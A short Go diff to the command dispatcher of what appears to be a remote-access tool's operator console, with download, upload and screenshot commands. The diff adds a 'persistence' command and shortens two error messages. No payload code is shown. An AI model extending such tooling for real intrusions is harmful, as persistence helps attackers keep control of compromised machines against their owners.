@@ -43,14 +43,14 @@ func (c ClientHandler) executor(input string) {
 			return
 		case "download":
 			if err := c.UseCase.Download.Validate(values); err != nil {
-				fmt.Println(color.Yellow, "[!] Invalid parameters to download!")
+				fmt.Println(color.Yellow, "[!] Invalid parameters!")
 				return
 			}
 			c.UseCase.Download.File(values[1])
 			return
 		case "upload":
 			if err := c.UseCase.Upload.Validate(values); err != nil {
-				fmt.Println(color.Yellow, "[!] Invalid parameters to upload!")
+				fmt.Println(color.Yellow, "[!] Invalid parameters!")
 				return
 			}
 			c.UseCase.Upload.File(values[1], values[2])
@@ -58,6 +58,15 @@ func (c ClientHandler) executor(input string) {
 		case "screenshot":
 			if err := c.UseCase.Screenshot.TakeScreenshot(); err != nil {
 				fmt.Println(color.Yellow, "[!] Error processing screenshot!", err.Error())
+			}
+			return
+		case "persistence":
+			if err := c.UseCase.Persistence.Validate(values); err != nil {
+				fmt.Println(color.Yellow, "[!] Invalid parameters!")
+				return
+			}
+			if err := c.UseCase.Persistence.Persist(values[1]); err != nil {
+				fmt.Println(color.Yellow, "[!] Error updating persistence!", err.Error())
 			}
 			return
 		case "exit":
